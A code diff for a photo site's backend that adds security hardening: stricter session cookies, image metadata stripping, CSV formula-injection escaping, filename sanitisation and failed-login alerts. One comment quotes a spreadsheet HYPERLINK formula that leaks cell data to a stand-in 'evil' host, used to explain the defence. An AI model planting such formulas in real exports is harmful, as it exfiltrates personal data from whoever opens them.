@@ -1,3 +1,5 @@
+import { dataSecurityHeaders, sanitizeFilename } from './security.js';
+
 let _cache = null;
 let _cacheAt = 0;
 const CACHE_TTL = 30_000;
@@ -139,12 +141,87 @@ export function generateToken() {
   return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
+// ---------------------------------------------------------------------------
+// Sessão do painel
+// ---------------------------------------------------------------------------
+// O cookie usa o prefixo `__Host-`, que não é cosmético: o browser só aceita
+// gravá-lo com Secure, Path=/ e SEM atributo Domain. Na prática isso significa
+// que nenhum outro host de lucafchala.com — nem um subdomínio comprometido, nem
+// um serviço de terceiro apontado por CNAME — consegue definir ou sobrescrever
+// o cookie de sessão deste site. É a única forma de fixação de sessão por
+// vizinho de domínio que o SameSite=Strict sozinho não cobria.
+//
+// O nome antigo (`session`) continua sendo LIDO para que o deploy não derrube a
+// sessão de quem já estava logado. Só gravamos o novo.
+export const SESSION_COOKIE = '__Host-session';
+export const SESSION_TTL_SECS = 86400;     // teto absoluto: 24 h, como antes
+export const SESSION_IDLE_SECS = 7200;     // 2 h sem uso encerram a sessão
+const SESSION_REFRESH_SECS = 600;          // só reescreve o "lastSeen" a cada 10 min
+
+export function sessionCookie(token, { clear = false } = {}) {
+  const base = `${SESSION_COOKIE}=${clear ? '' : token}; Path=/; HttpOnly; Secure; SameSite=Strict`;
+  return clear ? `${base}; Max-Age=0` : `${base}; Max-Age=${SESSION_TTL_SECS}`;
+}
+
+// Impressão grosseira do cliente. Só o User-Agent: IP fica de fora de propósito
+// porque celular troca de IP o tempo todo (4G <-> Wi-Fi) e amarrar a sessão a
+// ele significaria deslogar o admin no meio de uma edição. O UA muda só quando
+// o browser atualiza, e o custo desse caso é um login a mais.
+export function clientFingerprint(request) {
+  const ua = request.headers.get('User-Agent') || '';
+  let h = 2166136261; // FNV-1a de 32 bits: identificador curto, não é segredo
+  for (let i = 0; i < ua.length; i++) {
+    h ^= ua.charCodeAt(i);
+    h = Math.imul(h, 16777619);
+  }
+  return (h >>> 0).toString(36);
+}
+
+export function sessionRecord(request) {
+  const now = Date.now();
+  return JSON.stringify({ v: 1, createdAt: now, lastSeen: now, fp: clientFingerprint(request) });
+}
+
+// Encerra a sessão por qualquer um dos três motivos e some com a chave. Antes
+// isto era uma comparação com a string 'valid': uma sessão só morria pelo TTL
+// de 24 h do KV, sem inatividade e sem vínculo com o cliente que a abriu.
 export async function verifySession(env, request) {
   const cookies = request.headers.get('Cookie') || '';
-  const match = cookies.match(/(?:^|;\s*)session=([a-f0-9]{64})/);
+  const match = cookies.match(/(?:^|;\s*)(?:__Host-)?session=([a-f0-9]{64})/);
   if (!match) return false;
-  const valid = await env.FOTOS.get(`admin_session:${match[1]}`);
-  return valid === 'valid';
+
+  const token = match[1];
+  const key = `admin_session:${token}`;
+  const raw = await env.FOTOS.get(key);
+  if (!raw) return false;
+
+  // Sessão criada antes deste deploy: sem metadado. Aceita até expirar pelo
+  // TTL do KV, senão o deploy deslogaria quem estava no meio de um trabalho.
+  if (raw === 'valid') return true;
+
+  let rec;
+  try { rec = JSON.parse(raw); } catch { return false; }
+  if (!rec || typeof rec !== 'object') return false;
+
+  const now = Date.now();
+  if (rec.fp && rec.fp !== clientFingerprint(request)) {
+    await env.FOTOS.delete(key).catch(() => {});
+    return false;
+  }
+  if (typeof rec.lastSeen === 'number' && now - rec.lastSeen > SESSION_IDLE_SECS * 1000) {
+    await env.FOTOS.delete(key).catch(() => {});
+    return false;
+  }
+
+  // Renovação com trava: uma escrita a cada 10 min por sessão, não uma por
+  // requisição. O painel faz várias chamadas por tela e a cota de escrita do KV
+  // é de 1000/dia — sem a trava, uma tarde de uso consumiria a cota do site.
+  if (typeof rec.lastSeen !== 'number' || now - rec.lastSeen > SESSION_REFRESH_SECS * 1000) {
+    const ttl = Math.max(60, Math.round((rec.createdAt + SESSION_TTL_SECS * 1000 - now) / 1000));
+    await env.FOTOS.put(key, JSON.stringify({ ...rec, lastSeen: now }), { expirationTtl: ttl })
+      .catch(e => console.error('session refresh failed', e));
+  }
+  return true;
 }
 
 export async function checkRateLimit(env, ip, key, limit, windowSecs) {
@@ -308,6 +385,155 @@ export function safeUrl(url) {
   return toHttps(url);
 }
 
+// ---------------------------------------------------------------------------
+// Remoção de metadados (EXIF/GPS/XMP) das imagens enviadas
+// ---------------------------------------------------------------------------
+// A foto que chega pelo formulário de remoção é enviada por e-mail ao admin
+// como anexo. Uma foto de celular carrega EXIF com coordenada de GPS, modelo do
+// aparelho, número de série e data/hora exata. Ou seja: alguém que escreve
+// pedindo para *sumir* de uma foto acaba nos entregando, de brinde, onde a foto
+// foi tirada. Isso é o oposto do pedido, e não é dado de que precisamos para
+// atender a solicitação — o que a LGPD chama de minimização (art. 6º, III).
+//
+// A limpeza acontece no servidor, antes do anexo existir. Só JPEG, PNG e WebP
+// são tratados: são os três formatos onde a remoção é uma poda de contêiner
+// (dropar segmentos/chunks), sem recodificar o pixel. HEIC/AVIF/GIF passam
+// intactos — o EXIF neles vive dentro de caixas ISO-BMFF e mexer ali sem um
+// decodificador de verdade corre o risco de corromper a prova que o titular
+// mandou. Preferimos entregar a foto legível e registrar a limitação.
+
+// Segmentos JPEG que carregam metadado, não imagem:
+// APP1 (EXIF/XMP), APP2 (ICC/FlashPix), APP13 (IPTC/Photoshop) e o comentário.
+// APP0 (JFIF) fica: é o que define densidade/aspecto para alguns leitores.
+const JPEG_STRIP_MARKERS = new Set([
+  0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8,
+  0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xFE,
+]);
+
+function stripJpeg(bytes) {
+  // SOI, depois uma cadeia de segmentos `FF xx <len16> <payload>` até o SOS
+  // (0xDA), a partir do qual vêm os dados comprimidos — que copiamos inteiros.
+  if (bytes[0] !== 0xFF || bytes[1] !== 0xD8) return null;
+  const out = [bytes.subarray(0, 2)];
+  let i = 2;
+  while (i + 3 < bytes.length) {
+    if (bytes[i] !== 0xFF) return null; // fora de sincronia: não arrisque, devolva o original
+    const marker = bytes[i + 1];
+    if (marker === 0xD8 || marker === 0x01 || (marker >= 0xD0 && marker <= 0xD7)) { i += 2; continue; }
+    if (marker === 0xDA) { out.push(bytes.subarray(i)); break; } // SOS + dados comprimidos até o fim
+    const len = (bytes[i + 2] << 8) | bytes[i + 3];
+    if (len < 2 || i + 2 + len > bytes.length) return null; // comprimento corrompido
+    if (!JPEG_STRIP_MARKERS.has(marker)) out.push(bytes.subarray(i, i + 2 + len));
+    i += 2 + len;
+  }
+  return concatBytes(out);
+}
+
+// Chunks PNG ancilares que guardam metadado ou texto arbitrário. As críticas
+// (IHDR/PLTE/IDAT/IEND) e as de cor (gAMA/cHRM/sRGB/iCCP) ficam — sem elas a
+// imagem muda de aparência ou nem abre.
+const PNG_STRIP_CHUNKS = new Set(['eXIf', 'tEXt', 'iTXt', 'zTXt', 'tIME', 'dSIG']);
+
+function stripPng(bytes) {
+  const SIG = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
+  for (let i = 0; i < SIG.length; i++) if (bytes[i] !== SIG[i]) return null;
+  const out = [bytes.subarray(0, 8)];
+  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
+  let i = 8;
+  while (i + 8 <= bytes.length) {
+    const len = view.getUint32(i);
+    const type = String.fromCharCode(bytes[i + 4], bytes[i + 5], bytes[i + 6], bytes[i + 7]);
+    const total = 12 + len; // len + type(4) + data + crc(4)
+    if (len > bytes.length || i + total > bytes.length) return null;
+    if (!PNG_STRIP_CHUNKS.has(type)) out.push(bytes.subarray(i, i + total));
+    i += total;
+    if (type === 'IEND') break;
+  }
+  return concatBytes(out);
+}
+
+// WebP é RIFF: header de 12 bytes e uma sequência de chunks alinhados a 2.
+// EXIF e XMP são chunks próprios, então some com eles e reescreva o tamanho
+// declarado no header — que é o passo fácil de esquecer e que deixaria o
+// arquivo inválido.
+const WEBP_STRIP_CHUNKS = new Set(['EXIF', 'XMP ']);
+
+function stripWebp(bytes) {
+  const tag = o => String.fromCharCode(bytes[o], bytes[o + 1], bytes[o + 2], bytes[o + 3]);
+  if (tag(0) !== 'RIFF' || tag(8) !== 'WEBP') return null;
+  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
+  const body = [];
+  let i = 12;
+  while (i + 8 <= bytes.length) {
+    const type = tag(i);
+    const len = view.getUint32(i + 4, true); // RIFF é little-endian
+    const padded = len + (len % 2); // chunk ímpar leva 1 byte de padding
+    if (i + 8 + padded > bytes.length) return null;
+    if (!WEBP_STRIP_CHUNKS.has(type)) body.push(bytes.subarray(i, i + 8 + padded));
+    i += 8 + padded;
+  }
+  const bodyBytes = concatBytes(body);
+  const header = new Uint8Array(12);
+  header.set(bytes.subarray(0, 12));
+  new DataView(header.buffer).setUint32(4, bodyBytes.length + 4, true); // 'WEBP' + corpo
+  return concatBytes([header, bodyBytes]);
+}
+
+function concatBytes(chunks) {
+  const total = chunks.reduce((n, c) => n + c.length, 0);
+  const out = new Uint8Array(total);
+  let at = 0;
+  for (const c of chunks) { out.set(c, at); at += c.length; }
+  return out;
+}
+
+export function bytesFromBase64(b64) {
+  const bin = atob(b64);
+  const out = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+  return out;
+}
+
+export function base64FromBytes(bytes) {
+  // Em blocos: String.fromCharCode(...bytes) com 2 MB estoura o limite de
+  // argumentos da engine.
+  let bin = '';
+  const CHUNK = 0x8000;
+  for (let i = 0; i < bytes.length; i += CHUNK) {
+    bin += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
+  }
+  return btoa(bin);
+}
+
+// Devolve { base64, stripped, format }. Qualquer imprevisto (formato não
+// suportado, estrutura inesperada, erro de decodificação) devolve o original
+// com stripped=false: perder o anexo do titular seria pior do que manter o
+// metadado, e o resultado fica registrado para quem revisa o pedido.
+export function stripImageMetadata(b64) {
+  let bytes;
+  try { bytes = bytesFromBase64(b64); } catch { return { base64: b64, stripped: false, format: 'unknown' }; }
+  if (bytes.length < 12) return { base64: b64, stripped: false, format: 'unknown' };
+
+  let format = 'unknown';
+  let cleaned = null;
+  try {
+    if (bytes[0] === 0xFF && bytes[1] === 0xD8) { format = 'jpeg'; cleaned = stripJpeg(bytes); }
+    else if (bytes[0] === 0x89 && bytes[1] === 0x50) { format = 'png'; cleaned = stripPng(bytes); }
+    else if (String.fromCharCode(bytes[0], bytes[1], bytes[2], bytes[3]) === 'RIFF') { format = 'webp'; cleaned = stripWebp(bytes); }
+  } catch {
+    cleaned = null;
+  }
+
+  if (!cleaned || cleaned.length === 0 || cleaned.length > bytes.length) {
+    return { base64: b64, stripped: false, format };
+  }
+  try {
+    return { base64: base64FromBytes(cleaned), stripped: true, format };
+  } catch {
+    return { base64: b64, stripped: false, format };
+  }
+}
+
 // Sniff magic bytes from the start of a base64 payload to confirm it's an image
 // (not an arbitrary blob smuggled through the removal-upload field).
 export function isLikelyImage(b64) {
@@ -323,9 +549,36 @@ export function isLikelyImage(b64) {
 }
 
 // CSV export helpers (shared by the consent / removal / metrics exports).
+//
+// INJEÇÃO DE FÓRMULA — o motivo de este arquivo não ser trivial. O export de
+// consentimentos carrega campos que quem visita o site controla por inteiro:
+// `consenter_name` (digitado no gate do Drive), `user_agent` e `referrer`
+// (cabeçalhos crus). Excel, LibreOffice e Google Sheets tratam uma célula que
+// começa com `=`, `+`, `-`, `@`, TAB ou CR como fórmula e a executam ao abrir o
+// arquivo. Um nome como
+//
+//     =HYPERLINK("https://evil/?x="&A1,"clique")
+//
+// atravessa aspas de CSV sem problema (aspas são citação, não escape de
+// fórmula) e roda na planilha de quem exporta — ou seja, no computador do
+// admin, com o arquivo inteiro de dados pessoais aberto na frente. É uma
+// execução no cliente que nenhuma proteção do site alcança, porque acontece
+// depois do download.
+//
+// A defesa é prefixar com apóstrofo, que a planilha consome como "isto é
+// texto". Combinada com a citação normal do CSV, o valor continua legível e
+// deixa de ser executável.
+const CSV_FORMULA_PREFIX = /^[-=+@\t\r]/;
+
 export function csvCell(v) {
   if (v === null || v === undefined) return '';
-  const s = String(v);
+  let s = String(v);
+  // Antes de qualquer coisa: caracteres de controle fora. Eles não são dado
+  // legítimo em nenhuma das colunas exportadas e são exatamente o que dá para
+  // usar para forjar a estrutura do arquivo.
+  // eslint-disable-next-line no-control-regex
+  s = s.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '');
+  if (CSV_FORMULA_PREFIX.test(s)) s = "'" + s;
   return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 
@@ -336,8 +589,11 @@ export function csvResponse(filename, cols, rows) {
   const csv = '﻿' + [head, ...lines].join('\r\n') + '\r\n';
   return new Response(csv, {
     headers: {
-      'Content-Type': 'text/csv; charset=utf-8',
-      'Content-Disposition': `attachment; filename="${filename}"`,
+      ...dataSecurityHeaders('text/csv; charset=utf-8'),
+      // Nome vem de chamador interno, mas é interpolado num cabeçalho HTTP:
+      // aspas e CR/LF fora, sempre, para que a origem do valor nunca precise
+      // ser reauditada quando alguém acrescentar um export novo.
+      'Content-Disposition': `attachment; filename="${String(filename).replace(/[^\w.-]/g, '_')}"`,
     },
   });
 }
@@ -375,7 +631,10 @@ export async function sendRemovalEmail(env, req) {
   };
 
   if (req.fileBase64 && req.fileName) {
-    body.attachments = [{ filename: req.fileName, content: req.fileBase64 }];
+    // O nome vem cru do formulário público e vira o filename do anexo MIME.
+    // sanitizeFilename() tira travessia de caminho, CR/LF e dupla extensão —
+    // ver o comentário em security.js para o que cada uma delas faria aqui.
+    body.attachments = [{ filename: sanitizeFilename(req.fileName), content: req.fileBase64 }];
   }
 
   const res = await fetch('https://api.resend.com/emails', {
@@ -514,6 +773,60 @@ export async function sendErrorAlert(env, err, context = {}) {
   }
 }
 
+// Alerta de tentativas de login falhas. Sem isso, um ataque de força bruta
+// contra /dashboard/login é completamente silencioso: o rate limit segura o
+// volume, mas ninguém fica sabendo que houve tentativa — e "não fui avisado" é
+// a diferença entre trocar a senha hoje e descobrir daqui a seis meses.
+//
+// Mesmo contrato do sendErrorAlert: nunca lança (é chamado por waitUntil), tem
+// cooldown próprio para não virar flood, e não carrega corpo de requisição.
+// O IP entra truncado — é dado de segurança legítimo (art. 7º, IX + art. 16, I
+// da LGPD, registro para exercício regular de direito), mas não precisa de
+// precisão total num e-mail.
+const LOGIN_ALERT_COOLDOWN_SECS = 1800;
+
+export async function sendLoginAlert(env, { ip, attempts, windowMins, userAgent }) {
+  const apiKey = env.RESEND_API_KEY;
+  if (!apiKey || !env.ADMIN_EMAIL) return false;
+  try {
+    const cooldownKey = 'login-alert:cooldown';
+    if (await env.FOTOS.get(cooldownKey)) return false;
+    await env.FOTOS.put(cooldownKey, '1', { expirationTtl: LOGIN_ALERT_COOLDOWN_SECS });
+  } catch { /* falha de KV não pode engolir o alerta nem quebrar o login */ }
+
+  const esc = escape;
+  const html = `
+<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
+  <h2 style="font-size:18px;margin-bottom:4px">🔐 Tentativas de login no painel</h2>
+  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com/dashboard</p>
+  <p style="font-size:14px;line-height:1.6">Foram registradas <strong>${esc(attempts)}</strong> tentativas de login malsucedidas nos últimos ${esc(windowMins)} minutos.</p>
+  <table style="width:100%;border-collapse:collapse;font-size:14px">
+    <tr><td style="padding:8px 0;color:#666;width:120px">Origem (IP)</td><td style="padding:8px 0">${esc(ip)}</td></tr>
+    ${userAgent ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Navegador</td><td style="padding:8px 0;font-size:12px;color:#555">${esc(userAgent)}</td></tr>` : ''}
+    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
+  </table>
+  <p style="margin-top:20px;font-size:13px;line-height:1.6;color:#444">Se não foi você: troque a senha em <strong>/dashboard → Configurações</strong>. A troca também encerra todas as outras sessões abertas.</p>
+  <p style="margin-top:20px;font-size:12px;color:#bbb">Próximos alertas ficam em silêncio por ${Math.round(LOGIN_ALERT_COOLDOWN_SECS / 60)} min.</p>
+</div>`;
+
+  try {
+    const res = await fetch('https://api.resend.com/emails', {
+      method: 'POST',
+      signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
+      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        from: 'Fotos <noreply@lucafchala.com>',
+        to: [env.ADMIN_EMAIL],
+        subject: '🔐 Tentativas de login no painel — fotos.lucafchala.com',
+        html,
+      }),
+    });
+    return res.ok;
+  } catch {
+    return false;
+  }
+}
+
 export async function sendConfirmationEmail(env, req) {
   const apiKey = env.RESEND_API_KEY;
   if (!apiKey || !req.email) return false;
@@ -572,8 +885,8 @@ const PERF_SAMPLE_RATE = 0.1;
 // Um único beacon por visita, no visibilitychange. Um POST por imagem custaria
 // uma requisição de Worker por foto e transformaria a galeria de 12 cards em 13
 // requisições — o mesmo problema de cota que fez o cache via Worker ser descartado.
-export function perfBootScript(page, enabled) {
-  return `<script>(function(){
+export function perfBootScript(page, enabled, nonce = '') {
+  return `<script${nonce ? ` nonce="${nonce}"` : ''}>(function(){
   var busy=function(el,on){if(!el)return;if(on)el.setAttribute('aria-busy','true');else el.removeAttribute('aria-busy');};
   window.imgSettled=function(img,ok){var p=img&&img.parentElement;if(!p)return;p.classList.remove('loading');busy(p,false);if(!ok&&img.style)img.style.opacity='0';};
   window.perfMark=function(k,v){var m=window.__perf;if(m&&k in m.marks)m.marks[k]=v;};
